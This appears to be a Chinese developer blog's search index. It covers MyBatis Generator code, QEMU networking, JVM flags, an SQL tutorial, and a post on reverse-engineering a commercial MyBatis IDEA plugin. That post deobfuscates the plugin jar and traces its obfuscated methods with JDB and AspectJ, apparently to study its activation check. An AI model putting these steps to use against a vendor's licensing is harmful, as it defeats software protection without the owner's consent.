driverClass=\u0026#34;org.postgresql.Driver\u0026#34; connectionURL=\u0026#34;jdbc:postgresql://127.0.0.1:5432/postgres\u0026#34; userId=\u0026#34;123\u0026#34; password=\u0026#34;123456\u0026#34; /\u0026gt; \u0026lt;javaTypeResolver\u0026gt; \u0026lt;property name=\u0026#34;useJSR310Types\u0026#34; value=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;/javaTypeResolver\u0026gt; \u0026lt;javaModelGenerator targetPackage=\u0026#34;org.xhstormr.example.model\u0026#34; targetProject=\u0026#34;src/main/java\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;enableSubPackages\u0026#34; value=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;property name=\u0026#34;trimStrings\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;/javaModelGenerator\u0026gt; \u0026lt;sqlMapGenerator targetPackage=\u0026#34;mapper\u0026#34; targetProject=\u0026#34;src/main/resources\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;enableSubPackages\u0026#34; value=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;/sqlMapGenerator\u0026gt; \u0026lt;javaClientGenerator type=\u0026#34;XMLMAPPER\u0026#34; targetPackage=\u0026#34;org.xhstormr.example.mapper\u0026#34; targetProject=\u0026#34;src/main/java\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;enableSubPackages\u0026#34; value=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;/javaClientGenerator\u0026gt; \u0026lt;table tableName=\u0026#34;%\u0026#34; schema=\u0026#34;public\u0026#34; delimitIdentifiers=\u0026#34;true\u0026#34; delimitAllColumns=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;useActualColumnNames\u0026#34; value=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;generatedKey column=\u0026#34;id\u0026#34; sqlStatement=\u0026#34;JDBC\u0026#34; identity=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/context\u0026gt; \u0026lt;/generatorConfiguration\u0026gt; MyCommentGenerator.java import org.mybatis.generator.api.CommentGenerator; import org.mybatis.generator.api.IntrospectedColumn; import org.mybatis.generator.api.IntrospectedTable; import org.mybatis.generator.api.dom.java.*; import org.mybatis.generator.api.dom.xml.XmlElement; import java.util.Properties; import java.util.Set; public class MyCommentGenerator implements CommentGenerator { private static void addRemark(JavaElement element, String remarks) { if (remarks != null \u0026amp;\u0026amp; !remarks.trim().isEmpty()) { element.addJavaDocLine(\u0026#34;/**\u0026#34;); String[] remarkLines = remarks.split(System.getProperty(\u0026#34;line.separator\u0026#34;)); for (String remarkLine: remarkLines) { element.addJavaDocLine(\u0026#34; * \u0026#34; + remarkLine); } element.addJavaDocLine(\u0026#34; */\u0026#34;); } } @Override public void addConfigurationProperties(Properties properties) { } @Override public void addFieldComment(Field field, IntrospectedTable introspectedTable, IntrospectedColumn introspectedColumn) { String remarks = introspectedColumn.getRemarks(); addRemark(field, remarks); } @Override public void addFieldComment(Field field, IntrospectedTable introspectedTable) { } @Override public void addModelClassComment(TopLevelClass topLevelClass, IntrospectedTable introspectedTable) { String remarks = introspectedTable.getRemarks(); addRemark(topLevelClass, remarks); } @Override public void addClassComment(InnerClass innerClass, IntrospectedTable introspectedTable) { } @Override public void addClassComment(InnerClass innerClass, IntrospectedTable introspectedTable, boolean markAsDoNotDelete) { } @Override public void addEnumComment(InnerEnum innerEnum, IntrospectedTable introspectedTable) { } @Override public void addGetterComment(Method method, IntrospectedTable introspectedTable, IntrospectedColumn introspectedColumn) { } @Override public void addSetterComment(Method method, IntrospectedTable introspectedTable, IntrospectedColumn introspectedColumn) { } @Override public void addGeneralMethodComment(Method method, IntrospectedTable introspectedTable) { } @Override public void addJavaFileComment(CompilationUnit compilationUnit) { } @Override public void addComment(XmlElement xmlElement) { } @Override public void addRootComment(XmlElement rootElement) { } @Override public void addGeneralMethodAnnotation(Method method, IntrospectedTable introspectedTable, Set\u0026lt;FullyQualifiedJavaType\u0026gt; imports) { } @Override public void addGeneralMethodAnnotation(Method method, IntrospectedTable introspectedTable, IntrospectedColumn introspectedColumn, Set\u0026lt;FullyQualifiedJavaType\u0026gt; imports) { } @Override public void addFieldAnnotation(Field field, IntrospectedTable introspectedTable, Set\u0026lt;FullyQualifiedJavaType\u0026gt; imports) { } @Override public void addFieldAnnotation(Field field, IntrospectedTable introspectedTable, IntrospectedColumn introspectedColumn, Set\u0026lt;FullyQualifiedJavaType\u0026gt; imports) { String remarks = introspectedColumn.getRemarks(); addRemark(field, remarks); } @Override public void addClassAnnotation(InnerClass innerClass, IntrospectedTable introspectedTable, Set\u0026lt;FullyQualifiedJavaType\u0026gt; imports) { } } MyResultMapGenerator.java import org.mybatis.generator.api.GeneratedXmlFile; import org.mybatis.generator.api.IntrospectedTable; import org.mybatis.generator.api.PluginAdapter; import org.mybatis.generator.api.dom.xml.Attribute; import org.mybatis.generator.api.dom.xml.Document; import org.mybatis.generator.api.dom.xml.XmlElement; import org.mybatis.generator.codegen.XmlConstants; import org.mybatis.generator.codegen.mybatis3.xmlmapper.elements.AbstractXmlElementGenerator; import org.mybatis.generator.codegen.mybatis3.xmlmapper.elements.ResultMapWithoutBLOBsElementGenerator; import java.util.Collections; import java.util.List; /** * @author zhangzf * @create 2018/8/7 13:20 */ public class MyResultMapGenerator extends PluginAdapter { @Override public boolean validate(List\u0026lt;String\u0026gt; list) { return true; } @Override public List\u0026lt;GeneratedXmlFile\u0026gt; contextGenerateAdditionalXmlFiles(IntrospectedTable introspectedTable) { Document document = new Document(XmlConstants.MYBATIS3_MAPPER_PUBLIC_ID, XmlConstants.MYBATIS3_MAPPER_SYSTEM_ID); XmlElement root = new XmlElement(\u0026#34;mapper\u0026#34;); document.setRootElement(root); root.addAttribute(new Attribute(\u0026#34;namespace\u0026#34;, introspectedTable.getMyBatis3SqlMapNamespace())); initializeAndExecuteGenerator(root, introspectedTable, new ResultMapWithoutBLOBsElementGenerator(false)); GeneratedXmlFile xmlFile = new GeneratedXmlFile( document, introspectedTable.getMyBatis3XmlMapperFileName(), properties.getProperty(\u0026#34;targetPackage\u0026#34;, \u0026#34;mapper\u0026#34;), properties.getProperty(\u0026#34;targetProject\u0026#34;, \u0026#34;src/main/resources\u0026#34;), false, context.getXmlFormatter()); return Collections.singletonList(xmlFile); } private void initializeAndExecuteGenerator(XmlElement parentElement, IntrospectedTable introspectedTable, AbstractXmlElementGenerator elementGenerator) { elementGenerator.setContext(context); elementGenerator.setIntrospectedTable(introspectedTable); elementGenerator.addElements(parentElement); } } Reference http://www.mybatis.org/mybatis-3/zh/dynamic-sql.html https://github.com/mybatis/mybatis-dynamic-sql/releases/latest ","permalink":"https://xhstormr.github.io/blog/posts/mybatis-generator/","summary":"","title":"MyBatis Generator"},{"content":"Updated on 2018-07-15\nhttps://plugins.jetbrains.com/plugin/7293-mybatis-plugin\n两个模块： 本地端：使用 C 和 Rust 语言混合编写，主要用于与服务器验证激活。 插件端：使用 Java 和 Kotlin 语言混合编写，用于与 IDEA 进行交互。 使用 ZKM 进行代码混淆。 使用 jni-rs 从本地端通过 JNI 反射直接调用 Java 方法。 反混淆器 https://github.com/java-deobfuscator/deobfuscator java -jar deobfuscator-1.0.0.jar --config config.yml config.yml ---- input: iMybatis-3.67.jar output: output.jar path: - C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\rt.jar - C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\jce.jar - C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\ext\\jfxrt.jar - C:\\Program Files\\Java\\jdk1.8.0_152\\lib\\tools.jar transformers: - com.javadeobfuscator.deobfuscator.transformers.zelix.string.SimpleStringEncryptionTransformer - com.javadeobfuscator.deobfuscator.transformers.zelix.string.EnhancedStringEncryptionTransformer JDB 动态调试 https://docs.oracle.com/javase/8/docs/technotes/tools/windows/jdb.html https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/conninv.html Server: javac -g Main.java java -agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=8000 Main Client: jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=8000 stop in java.lang.String.length run clear java.lang.String.length where list locals print new com.a.a.h.d.r().a(365) exit // 以代码方式监控特定类 fun main() { val classToWatch = \u0026#34;org.example.Main\u0026#34; // com.sun.tools.jdi.SocketAttachingConnector val connector = Bootstrap.virtualMachineManager() .attachingConnectors() .single { it.name() == \u0026#34;com.sun.jdi.SocketAttach\u0026#34; } val virtualMachine = with(connector.defaultArguments()) { this[\u0026#34;port\u0026#34;]?.setValue(\u0026#34;8000\u0026#34;) this[\u0026#34;hostname\u0026#34;]?.setValue(\u0026#34;localhost\u0026#34;) connector.attach(this) } val requestManager = virtualMachine.eventRequestManager() fun Field.watch() { println(\u0026#34;Watching field: $this\u0026#34;) with(requestManager.createModificationWatchpointRequest(this)) { setSuspendPolicy(EventRequest.SUSPEND_EVENT_THREAD) enable() } } val isEmpty = virtualMachine.classesByName(classToWatch).isEmpty() if (isEmpty) { with(requestManager.createClassPrepareRequest()) { addClassFilter(classToWatch) enable() } } else { val referenceType = virtualMachine.classesByName(classToWatch).single() referenceType.allFields().forEach(Field::watch) } virtualMachine.resume() val queue = virtualMachine.eventQueue() while (true) { val set = queue.remove() set.forEach { when (it) { is ClassPrepareEvent -\u0026gt; { val referenceType = it.referenceType() if (referenceType.name() == classToWatch) { referenceType.allFields().forEach(Field::watch) } } is ModificationWatchpointEvent -\u0026gt; { with(it) { println(\u0026#34;${field()}: ${valueCurrent()} -\u0026gt; ${valueToBe()}\u0026#34;) } val thread = it.thread() println(thread) thread.frames().forEach { with(it.location()) { println(\u0026#34;\\t${method()} -\u0026gt; $this\u0026#34;) } } } } } set.resume() } } AspectJ 拦截方法 https://search.maven.org/search?q=g:org.aspectj https://mirrors.tuna.tsinghua.edu.cn/eclipse/tools/aspectj/ aspectjrt, aspectjtools, aspectjweaver https://www.eclipse.org/aspectj/doc/released/progguide/semantics.html https://www.eclipse.org/aspectj/doc/released/devguide/ltw-configuration.html https://www.eclipse.org/aspectj/doc/released/runtime-api/allclasses-frame.html 使用加载时编织（Load-time Weaving），兼容性比较好。 Tracing.aj import org.aspectj.lang.JoinPoint; import org.aspectj.lang.reflect.MethodSignature; import java.io.IOException; import java.io.PrintWriter; import java.lang.reflect.Modifier; import java.nio.charset.StandardCharsets; import java.nio.file.Files; import java.nio.file.Path; import java.nio.file.Paths; import java.nio.file.StandardOpenOption; import java.time.LocalDateTime; import java.time.format.DateTimeFormatter; import java.util.Arrays; public aspect Tracing { private static final String STR = \u0026#34; \u0026#34;; private static final Path LOG_FILE; /*call 最好只用于 static、native 方法，以免编织时发生异常*/ private static final pointcut p1(): execution(* com.a.a.h.d.r.*(..)) || call(native * com.a..*(..)) || (call(static String com.a..*(..)) \u0026amp;\u0026amp; !call(static String com.a.a.h.a.c.a(int, int))); static { LocalDateTime now = LocalDateTime.now(); DateTimeFormatter formatter = DateTimeFormatter.ofPattern(\u0026#34;yyyy-MM-dd_HH.mm.ss\u0026#34;); LOG_FILE = Paths.get(\u0026#34;D:/Download\u0026#34;, String.format(\u0026#34;Tracing_%s.log\u0026#34;, now.format(formatter))); } private static boolean isNative(JoinPoint.StaticPart jpsp) { int modifiers = jpsp.getSignature().getModifiers(); return Modifier.isNative(modifiers); } private static boolean isReturnVoid(JoinPoint.StaticPart jpsp) { Class returnType = ((MethodSignature) jpsp.getSignature()).getReturnType(); return returnType == Void.TYPE; } private static PrintWriter getLogWriter() throws IOException { return new PrintWriter(Files.newBufferedWriter(LOG_FILE, StandardCharsets.UTF_8, StandardOpenOption.CREATE, StandardOpenOption.APPEND)); } Object around(): p1() { try (PrintWriter writer = getLogWriter()) { writer.println(thisJoinPoint.toLongString()); writer.println(STR + \u0026#34;args: \u0026#34; + Arrays.toString(thisJoinPoint.getArgs())); //输出参数 Object result = proceed(); //执行原有方法体 writer.println(STR + \u0026#34;return: \u0026#34; + result); //输出原有返回值 return result; //指定返回值 } catch (IOException e) { e.printStackTrace(); return null; } } // before(): p2() { // try (PrintWriter writer = getLogWriter()) { // writer.println(thisJoinPoint.toLongString()); // // writer.println(STR + \u0026#34;args: \u0026#34; + Arrays.toString(thisJoinPoint.getArgs())); // } catch (IOException e) { // e.printStackTrace(); // } // } // // after() returning(Object result): p2() { // try (PrintWriter writer = getLogWriter()) { // writer.println(thisJoinPoint.toLongString()); // // writer.println(STR + \u0026#34;return: \u0026#34; + result); // } catch (IOException e) { // e.printStackTrace(); // } // } } aop-ajc.xml \u0026lt;aspectj\u0026gt; \u0026lt;aspects\u0026gt; \u0026lt;aspect name=\u0026#34;Tracing\u0026#34;/\u0026gt; \u0026lt;/aspects\u0026gt; \u0026lt;weaver options=\u0026#34;-Xlint:ignore -showWeaveInfo\u0026#34;\u0026gt; \u0026lt;include within=\u0026#34;com.a..*\u0026#34;/\u0026gt; \u0026lt;/weaver\u0026gt; \u0026lt;/aspectj\u0026gt; 编译 java -cp aspectjtools-1.9.1.jar;aspectjrt-1.9.1.jar; org.aspectj.tools.ajc.Main -outjar 123.jar -outxml -1.8 -Xlint:ignore Tracing.aj 运行 ideaIU-2018.1\\bin\\idea64.exe.vmoptions ---- -javaagent:D:\\Download\\aspectjweaver-1.9.1.jar .IntelliJIdea2018.1\\config\\plugins\\MyBatis\\lib ---- 123.jar ","permalink":"https://xhstormr.github.io/blog/posts/reverse-mybatis-plugin/","summary":"","title":"逆向 MyBatis plugin"},{"content":"Updated on 2018-07-14\n-Xms: JVM 初始堆内存大小。 -Xmx: JVM 最大堆内存大小。 -server -Xms3g -Xmx3g -Xverify:none -XX:+UseG1GC Reference https://docs.oracle.com/javase/8/docs/technotes/tools/windows/java.html ","permalink":"https://xhstormr.github.io/blog/posts/idea-jvm-setting/","summary":"","title":"IntelliJ IDEA JVM 设置"},{"content":"Updated on 2018-04-22\nhttps://wiki.qemu.org/Documentation\nhttps://qemu.weilnetz.de/doc/qemu-doc.html\nQEMU https://qemu.weilnetz.de/w64/ 创建镜像：qemu-img.exe create -f qcow2 123.qcow2 512M 安装系统：qemu-system-x86_64.exe -hda 123.qcow2 -m 512M -nographic -boot once=d,menu=on -cdrom alpine-virt-3.7.0-x86_64.iso 启动系统：qemu-system-x86_64.exe -hda 123.qcow2 -m 512M -nographic 脱离：Ctrl+Alt+G 全屏：Ctrl+Alt+F TAP https://build.openvpn.net/downloads/releases/tap-windows-9.24.2.zip 安装：tapinstall install OemVista.inf TAP0901 卸载：tapinstall remove TAP0901 重命名 TAP 接口 ---- netsh interface show interface \u0026#34;以太网 2\u0026#34; netsh interface set interface \u0026#34;以太网 2\u0026#34; newname=my_tap netsh interface show interface my_tap https://github.com/OpenVPN/tap-windows6 Linux https://mirrors.tuna.tsinghua.edu.cn/alpine/latest-stable/releases/x86_64/alpine.iso https://mirrors.tuna.tsinghua.edu.cn/tinycorelinux/9.x/x86_64/release/CorePure64.iso Alpine ---- 设置：setup-alpine 安装：apk add curl tree vim 服务：rc-service -l 重启：reboot 关机：poweroff 允许 ROOT 用户密码登录 SSH ---- echo PermitRootLogin yes \u0026gt;\u0026gt; /etc/ssh/sshd_config Windows https://sourceforge.net/projects/reactos/files/ReactOS/ 网络连接 NAT 1. 无网络配置的缺省模式。 2. 虚拟机可以通过宿主机访问外网，但宿主机无法访问虚拟机。 配置端口转发，使宿主机能够访问虚拟机的 22 端口 ---- -nic user,hostfwd=tcp::5555-:22 TAP -nic tap,ifname=my_tap,script=no 桥接 1. TAP 接口和虚拟机的接口都为 DHCP。 2. TAP 接口和宿主机的主网络适配器组成网桥，使宿主机和虚拟机在同一网段。 3. 虚拟机的接口的 IP 地址将直接由外部路由器分配。 宿主机 ---- netsh interface ipv4 set address my_tap dhcp netsh interface ipv4 show addresses my_tap 虚拟机 ---- dhcp 非桥接 1. TAP 接口和虚拟机的接口都为 STATIC。 2. 虚拟机除网关 10.1.1.1 外，不能访问任何外部网络，但宿主机能够访问虚拟机，与 NAT 模式相反。 3. 怀疑是网关 10.1.1.1 的路由问题，有待解决。 宿主机 ---- netsh interface ipv4 set address my_tap static 10.1.1.1 255.255.255.0 netsh interface ipv4 show addresses my_tap 虚拟机 ---- static address 10.1.1.15 netmask 255.255.255.0 gateway 10.1.1.1 ","permalink":"https://xhstormr.github.io/blog/posts/qemu/","summary":"","title":"QEMU"},{"content":"Updated on 2018-04-14\nhttps://zh.m.wikipedia.org/zh-cn/SQL\n/*2 检索*/ SELECT * FROM Products; SELECT prod_name FROM Products; -- DISTINCT 去重，作用于所有列 SELECT DISTINCT vend_id FROM Products; -- LIMIT 限制数量，OFFSET 偏移数量 SELECT prod_name FROM Products LIMIT 5 OFFSET 5; /*3 排序*/ -- ORDER BY 排序 SELECT prod_name FROM Products ORDER BY prod_name; -- 按多个列排序 SELECT prod_id, prod_price, prod_name FROM Products ORDER BY prod_price, prod_name; -- 等同于 SELECT prod_id, prod_price, prod_name FROM Products ORDER BY 2, 3; -- DESC 降序排序（缺省为升序 ASC） SELECT prod_id, prod_price, prod_name FROM Products ORDER BY prod_price DESC, prod_name; /*4 过滤*/ -- 检查单个值 SELECT prod_name, prod_price FROM Products WHERE prod_price = 3.49; SELECT prod_name, prod_price FROM Products WHERE prod_price \u0026lt;= 10; -- 不匹配检查 SELECT vend_id, prod_name FROM Products WHERE vend_id != \u0026#39;DLL01\u0026#39;; -- 范围值检查 SELECT prod_name, prod_price FROM Products WHERE prod_price BETWEEN 5 AND 10; -- 空值检查 SELECT cust_name FROM CUSTOMERS WHERE cust_email IS NULL; /*5 高级过滤*/ -- AND 且 SELECT prod_name, prod_price FROM Products WHERE vend_id = \u0026#39;DLL01\u0026#39; AND prod_price \u0026lt;= 4; -- OR 或 SELECT prod_name, prod_price FROM Products WHERE vend_id = \u0026#39;DLL01\u0026#39; OR vend_id = \u0026#39;BRS01\u0026#39;; -- NOT 非，条件取反，可以否定（取反）任何条件 SELECT prod_name, prod_price FROM Products WHERE NOT vend_id = \u0026#39;FNG01\u0026#39;; -- IN 条件范围，与 OR 功能相当，推荐使用 SELECT prod_name, prod_price FROM Products WHERE vend_id IN (\u0026#39;DLL01\u0026#39;, \u0026#39;BRS01\u0026#39;); -- () 条件组合，管理比较顺序 SELECT prod_name, prod_price FROM Products WHERE (vend_id = \u0026#39;DLL01\u0026#39; OR vend_id = \u0026#39;BRS01\u0026#39;) AND prod_price \u0026gt;= 10; /*6 通配符*/ -- LIKE 模式匹配，只能用于字符串。出于性能考虑，最好放在过滤条件的最后 -- % 多个字符（任意字符出现任意次数），注意不会匹配 NULL SELECT prod_id, prod_name FROM Products WHERE prod_name LIKE \u0026#39;%teddy bear%\u0026#39;; -- _ 单个字符（不多也不少） SELECT prod_id, prod_name FROM Products WHERE prod_name LIKE \u0026#39;__ inch teddy bear%\u0026#39;; /*7 创建计算字段*/ -- TRIM() 函数清除左右两边的空格 -- || 拼接字段 -- AS 使用别名 SELECT vend_name || \u0026#39; (\u0026#39; || vend_country || \u0026#39;)\u0026#39; AS vend_title FROM Vendors; SELECT TRIM(vend_name) || \u0026#39; (\u0026#39; || TRIM(vend_country) || \u0026#39;)\u0026#39; AS vend_title FROM Vendors; -- 执行数字计算 SELECT prod_id, quantity, item_price, quantity * item_price AS expanded_price FROM OrderItems WHERE order_num = 20008; -- SELECT 语句可以用于测试表达式 SELECT 3 * 2; SELECT TRIM(\u0026#39; ABC \u0026#39;); SELECT NOW(); SELECT CURRENT_DATE; /*8 函数*/ -- 数值函数 -- 系统函数 -- 文本函数 SELECT vend_name, UPPER(vend_name) AS vend_name_upcase FROM Vendors; -- 时间函数 SELECT order_num FROM Orders WHERE DATE_PART(\u0026#39;year\u0026#39;, order_date) = 2012; /*9 汇总数据*/ -- 聚集函数 -- COUNT(*) 总行数 -- COUNT(column) 该列的行数（忽略 NULL） -- SUM(column) 该列的总和 -- AVG(column) 该列的平均值 -- MAX(column) 该列的最大值 -- MIN(column) 该列的最小值 -- 聚集不同值 -- DISTINCT 去重（缺省为所有行 ALL） SELECT COUNT(DISTINCT prod_price) AS num_price_dist, COUNT(prod_price) AS num_price, AVG(DISTINCT prod_price) AS avg_price_dist, AVG(prod_price) AS avg_price, MAX(prod_price) AS max_price, MIN(prod_price) AS min_price, SUM(prod_price) AS sum_price FROM Products WHERE vend_id = \u0026#39;DLL01\u0026#39;; SELECT SUM(item_price * quantity) AS total_price FROM OrderItems WHERE order_num = 20005; /*10 分组数据*/ -- 创建分组 -- GROUP BY 子句指示 DBMS 进行数据分组，然后对每个组进行聚集，而不是对整个结果集 -- GROUP BY x 根据 x 列进行分组 -- GROUP BY x, y 根据 x 列和 y 列进行分组（将 x 列和 y 列的值视为一个整体来分组） SELECT vend_id, COUNT(*) AS num_prods FROM Products GROUP BY vend_id; -- 等同于 SELECT vend_id, COUNT(*) AS num_prods FROM Products GROUP BY 1; -- 过滤分组 -- WHERE 过滤行， -- HAVING 过滤组； -- WHERE 在数据分组前进行过滤， -- HAVING 在数据分组后进行过滤。 SELECT vend_id, COUNT(*) AS num_prods -- 计数 FROM Products WHERE prod_price \u0026gt;= 4 -- 过滤（行级） GROUP BY 1 -- 分组 HAVING COUNT(*) \u0026gt;= 2 -- 过滤（组级） ORDER BY num_prods, 1 DESC; -- 排序 /*11 子查询*/ -- 子查询：嵌套在其他查询中的查询，只能查询单个列，总是由内向外进行处理 -- 子查询性能不好，推荐使用联结（JOIN） -- 填充 IN 操作符 -- 显示订购产品 RGAN01 的顾客列表 SELECT order_num FROM OrderItems WHERE prod_id = \u0026#39;RGAN01\u0026#39;; -- + SELECT cust_id FROM Orders WHERE order_num IN (20007, 20008); -- = SELECT cust_id FROM Orders WHERE order_num IN (SELECT order_num FROM OrderItems WHERE prod_id = \u0026#39;RGAN01\u0026#39;); -- + SELECT cust_name, cust_contact FROM Customers WHERE cust_id IN (\u0026#39;1000000004\u0026#39;, \u0026#39;1000000005\u0026#39;); -- = SELECT cust_name, cust_contact FROM Customers WHERE cust_id IN (SELECT cust_id FROM Orders WHERE order_num IN (SELECT order_num FROM OrderItems WHERE prod_id = \u0026#39;RGAN01\u0026#39;)); -- 填充计算列 SELECT COUNT(*) AS orders FROM Orders WHERE cust_id = \u0026#39;1000000001\u0026#39;; -- + SELECT cust_name, cust_state FROM Customers; -- = SELECT cust_name, cust_state, (SELECT COUNT(*) FROM Orders WHERE Orders.cust_id = Customers.cust_id) AS orders -- 避免歧义 FROM Customers; /*12 联结表*/ -- 联结机制：在一条 SELECT 语句中关联多个表中配对成功的行，返回一组输出 -- 联结方式：首先列出所有表，然后定义表之间的配对条件 -- 注意： -- ON 只用于连接行（联结） -- WHERE 只用于过滤行 -- 显示订购产品 RGAN01 的顾客列表 -- 等值联结（内联结） SELECT cust_name, cust_contact FROM Orders, Customers, OrderItems WHERE prod_id = \u0026#39;RGAN01\u0026#39; AND Orders.order_num = OrderItems.order_num AND Orders.cust_id = Customers.cust_id; -- 简单格式 SELECT vend_name, prod_name FROM Vendors, Products WHERE Vendors.vend_id = Products.vend_id; -- 等同于 -- 标准格式 SELECT vend_name, prod_name FROM Vendors -- 联结机制 INNER JOIN Products ON Vendors.vend_id = Products.vend_id; -- 配对条件 /*13 高级联结*/ -- 自联结（self-join） -- 多次引用相同的表 SELECT c1.cust_id, c1.cust_name, c1.cust_contact FROM Customers AS c1, Customers AS c2 WHERE c2.cust_contact = \u0026#39;Jim Jones\u0026#39; AND c1.cust_name = c2.cust_name; -- 自然联结（natural join） -- 等值联结（内联结）的特例化 -- 联结时，自动比较名称相同的列 -- 输出时，自动去除名称相同的列 SELECT * FROM Vendors NATURAL JOIN Products; -- 对比 SELECT * FROM Vendors INNER JOIN Products ON Vendors.vend_id = Products.vend_id; SELECT cust_name, cust_contact FROM Orders NATURAL JOIN Customers NATURAL JOIN OrderItems WHERE prod_id = \u0026#39;RGAN01\u0026#39;; -- 外联结（outer join） -- 全外联结：内联结 + 全部表没有配对成功的行（FULL） -- 左外联结：内联结 + 左边表没有配对成功的行（LEFT） -- 右外联结：内联结 + 右边表没有配对成功的行（RIGHT） -- 左外联结和右外联结可以交换使用，区别在于关联表的顺序 SELECT Customers.cust_id, Orders.order_num FROM Customers LEFT OUTER JOIN Orders ON Customers.cust_id = Orders.cust_id; -- 等同于 SELECT Customers.cust_id, Orders.order_num FROM Orders RIGHT OUTER JOIN Customers ON Customers.cust_id = Orders.cust_id; -- 带有聚集函数的联结 SELECT Customers.cust_id, COUNT(Orders.order_num) AS num_ord FROM Customers LEFT OUTER JOIN Orders ON Customers.cust_id = Orders.cust_id GROUP BY Customers.cust_id ORDER BY 2 DESC; /*14 组合查询*/ -- 并（union）：执行多条 SELECT 语句，并合并为一个结果集 -- UNION 和 WHERE 的多个 OR 条件所完成的工作相同 -- UNION 无重复行， -- UNION ALL 有重复行。 SELECT cust_name, cust_contact FROM Customers WHERE cust_state IN (\u0026#39;IL\u0026#39;, \u0026#39;IN\u0026#39;, \u0026#39;MI\u0026#39;) UNION SELECT cust_name, cust_contact FROM Customers WHERE cust_name = \u0026#39;Fun4All\u0026#39;; -- 等同于 SELECT cust_name, cust_contact FROM Customers WHERE cust_state IN (\u0026#39;IL\u0026#39;, \u0026#39;IN\u0026#39;, \u0026#39;MI\u0026#39;) OR cust_name = \u0026#39;Fun4All\u0026#39;; /*15 插入数据*/ -- 插入完整行 INSERT INTO Customers VALUES (\u0026#39;1000000006\u0026#39;, \u0026#39;Toy Land\u0026#39;, \u0026#39;123 Any Street\u0026#39;, \u0026#39;New York\u0026#39;, \u0026#39;NY\u0026#39;, \u0026#39;11111\u0026#39;, \u0026#39;USA\u0026#39;,NULL,NULL); -- 插入部分行 INSERT INTO Customers (cust_id, cust_name, cust_address, cust_city, cust_state, cust_zip) VALUES (\u0026#39;1000000006\u0026#39;, \u0026#39;Toy Land\u0026#39;, \u0026#39;123 Any Street\u0026#39;, \u0026#39;New York\u0026#39;, \u0026#39;NY\u0026#39;, \u0026#39;11111\u0026#39;); -- 导入行（INSERT SELECT） INSERT INTO Customers (cust_id, cust_name, cust_address, cust_city, cust_state, cust_zip) SELECT cust_id, cust_name, cust_address, cust_city, cust_state, cust_zip FROM CustNew; -- 导出行（SELECT INTO） SELECT * INTO CustNew FROM Customers; /*16 更新和删除数据*/ -- 更新指定行 UPDATE Customers SET cust_contact = \u0026#39;Sam Roberts\u0026#39;, cust_email = \u0026#39;sam@toyland.com\u0026#39; WHERE cust_id = \u0026#39;1000000006\u0026#39;; UPDATE account SET \u0026#34;role\u0026#34; = CASE \u0026#34;role\u0026#34; WHEN \u0026#39;USER1\u0026#39; THEN \u0026#39;STAFF1\u0026#39; WHEN \u0026#39;USER2\u0026#39; THEN \u0026#39;STAFF2\u0026#39; ELSE \u0026#34;role\u0026#34; END; -- 删除指定行 DELETE FROM Customers WHERE cust_id = \u0026#39;1000000006\u0026#39;; -- 删除所有行 TRUNCATE TABLE Customers; /*17 创建和操纵表*/ /*18 视图*/ -- 一张虚拟表，包含的不是数据，而是 SELECT 语句，用于动态检索数据，可以重用 SQL，简化复杂数据的处理 -- 创建视图 -- 用于封装复杂的查询语句 CREATE OR REPLACE VIEW ProductCustomers AS SELECT cust_name, cust_contact, prod_id FROM Customers, Orders, OrderItems WHERE Customers.cust_id = Orders.cust_id AND OrderItems.order_num = Orders.order_num; -- 用于简化计算字段 CREATE OR REPLACE VIEW OrderItemsExpanded AS SELECT prod_id, quantity, item_price, quantity * item_price AS expanded_price, order_num FROM OrderItems; -- 用于格式化检索出的数据 CREATE OR REPLACE VIEW VendorLocations AS SELECT TRIM(vend_name) || \u0026#39; (\u0026#39; || TRIM(vend_country) || \u0026#39;)\u0026#39; AS vend_title FROM Vendors; -- 使用视图 SELECT * FROM ProductCustomers WHERE prod_id = \u0026#39;RGAN01\u0026#39;; SELECT * FROM OrderItemsExpanded WHERE order_num = 20008; SELECT * FROM VendorLocations; -- 删除视图 DROP VIEW ProductCustomers; /*19 存储过程*/ /*20 事务处理*/ /*21 游标*/ /*22 SQL 特性*/ -- 约束：管理如何插入或处理数据库数据 -- 主键 ALTER TABLE Vendors ADD PRIMARY KEY (vend_id); -- 外键 ALTER TABLE Orders ADD FOREIGN KEY (cust_id) REFERENCES Customers (cust_id); -- 检查约束 ALTER TABLE OrderItems ADD CHECK (quantity \u0026gt; 0); -- 唯一约束 -- 索引：改善检索数据的性能 -- 用于对列进行过滤和排序 -- 取值范围越大的列做索引效果越好，比如姓名列就比性别列收益高 CREATE INDEX prod_name_ind ON Products (prod_name); -- 触发器：特殊的存储过程，在单表发生特定动作时自动执行 -- INSERT 时能够访问新数据 -- UPDATE 时能够访问新数据和旧数据 -- DELETE 时能够访问删除的数据 CREATE TABLE emp ( empname TEXT, salary INTEGER, last_user TEXT, last_date TIMESTAMP ); CREATE OR REPLACE FUNCTION emp_stamp() RETURNS TRIGGER AS $$ BEGIN IF NEW.empname IS NULL THEN RAISE EXCEPTION \u0026#39;empname cannot be null\u0026#39;; END IF; IF NEW.salary IS NULL THEN RAISE EXCEPTION \u0026#39;% cannot have null salary\u0026#39;, NEW.empname; END IF; IF NEW.salary \u0026lt; 0 THEN RAISE EXCEPTION \u0026#39;% cannot have a negative salary\u0026#39;, NEW.empname; END IF; -- 记录最后操作的人和日期 NEW.last_user := current_user; NEW.last_date := current_timestamp; RETURN NEW; END; $$ LANGUAGE plpgsql; CREATE TRIGGER emp_stamp BEFORE INSERT OR UPDATE ON emp FOR EACH ROW EXECUTE PROCEDURE emp_stamp(); Reference SQL 风格 https://www.sqlstyle.guide/zh/ https://launchbylunch.com/posts/2014/Feb/16/sql-naming-conventions/ 